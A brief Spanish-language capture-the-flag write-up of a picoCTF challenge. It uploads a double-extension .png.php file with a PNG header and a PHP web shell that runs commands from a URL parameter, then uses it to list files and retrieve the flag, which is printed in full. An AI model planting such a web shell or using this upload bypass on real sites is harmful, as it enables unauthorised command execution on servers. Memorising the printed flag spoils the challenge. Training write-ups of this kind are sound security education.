## Descripción
I found a web app that can help process images: PNG images only!
## Solución
Lo que haremos sera subir un archivo para engañar al sistema subiendo una imagen png para acceder a los uploads que sale en robots.txt que esta desabilitado, para poder acceder tenemos que hacer un script sencillo 
```
└─$ cat holaestoesuncodigo.png.php   
PNG
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo"</pre>";
}
?>

```
Luego accedemos a la pagina y nos empezamos a mover con ls y saber con pwd en la barra de busquedas de ahi en la pagina, la bandera esta en un archivo `MQZWCYZWGI2WE.txt` y es `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}`
## Notas Adicionales 
## Referencias
